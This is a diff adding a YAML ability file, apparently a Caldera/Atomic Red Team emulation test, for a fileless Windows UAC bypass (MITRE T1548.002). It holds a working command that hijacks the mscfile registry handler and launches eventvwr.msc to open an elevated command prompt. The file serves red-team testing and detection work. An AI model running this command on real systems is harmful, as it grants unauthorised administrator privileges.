@@ -1,0 +1,35 @@
+- id: 5073adf8-9a50-4bd9-b298-a9bd2ead8af9
+  name: Bypass UAC using Event Viewer (cmd)
+  description: 'Bypasses User Account Control using Event Viewer and a relevant Windows
+    Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+
+    Upon execution command prompt should be launched with administrative privileges.'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      sh:
+        command: reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve
+          /d "C:\Windows\System32\cmd.exe" /f; cmd.exe /c eventvwr.msc
+        cleanup: reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - privilege-escalation
+  - t1548.002
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      executable_binary:
+        description: Binary to execute with UAC Bypass
+        type: path
+        default: C:\Windows\System32\cmd.exe
+    technique_created: '2020-01-30T14:24:34.977Z'
+    atomic_guid: 5073adf8-9a50-4bd9-b298-a9bd2ead8af9
+    import_timestamp: '2025-06-24T11:15:01.624172Z'
